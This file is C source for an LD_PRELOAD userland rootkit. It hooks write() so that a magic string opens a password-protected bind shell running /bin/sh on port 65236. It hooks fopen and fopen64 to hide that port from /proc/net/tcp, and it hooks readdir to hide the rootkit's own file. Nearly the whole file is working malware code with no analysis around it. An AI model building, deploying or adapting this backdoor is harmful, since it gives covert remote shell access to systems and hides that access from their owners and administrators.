#include<stdio.h>
#include<netinet/in.h>
#include<sys/socket.h>
#include<dlfcn.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>
#include<dirent.h>


#define KEY "whatsupali"
#define PASS "givemebash"
#define HEX_PORT "FED4"
#define PORT 65236
#define FILENAME "rootkit.so"


int bind_shell(){
	int sockfd, session;
	
	sockfd = socket(AF_INET,SOCK_STREAM,0);
	
	if (sockfd < 0){
		printf("failed to create socket\n");
		return -1;
	}

	
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);
	server_addr.sin_addr.s_addr = 0;


	const static int optval = 1;

	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

	if ( 0 > bind(sockfd,(struct sockaddr *)&server_addr,sizeof(server_addr))){
		printf("failed to bind\n!");
		return -1;
	}

	//bind completed
	if (listen(sockfd,0) < 0){
		printf("failed to start listening;\n");
		return -1;
	}
	
	session  = accept(sockfd,NULL,NULL);


	for (int i = 0; i < 3; i++)
		dup2(session, i);
	
	char input[30];

	read(session, input, sizeof(input));
	input[strcspn(input, "\n")] = 0;
	if (strcmp(input, PASS) == 0){
		execve("/bin/sh",NULL,NULL);
		close(sockfd);
	}else{
		shutdown(sockfd, SHUT_RDWR);
		close(sockfd);
	}
	

}

ssize_t write(int fd, const void *buf, size_t count){

	ssize_t (*new_write)(int fd, const void *buf, size_t count);
	new_write = dlsym(RTLD_NEXT,"write");

	ssize_t result;

	char *bind = strstr(buf, KEY);
	if (bind != NULL){
		bind_shell();
	}
	else{
		return new_write(fd,buf,count);
	}

}

FILE *(*orig_fopen64)(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode){
	
	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL){
		
		char line[256];
		FILE *temp = tmpfile64();
		fp = orig_fopen64(pathname, mode);
		while (fgets(line, sizeof(line), fp)){
			char *listener = strstr(line, HEX_PORT);
			if (listener != NULL){
				continue;
			}
			else{
				fputs(line, temp);
			}
		}
		return temp;
	}

	fp = orig_fopen64(pathname, mode);
	return fp;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode){
	
	orig_fopen = dlsym(RTLD_NEXT, "fopen");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL){
		
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp)){
			
			char *listener = strstr(line, HEX_PORT);
			if (listener != NULL){
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;

	}

	fp = orig_fopen(pathname, mode);
	return fp;
}

struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp){
	
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp)){
	    
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}
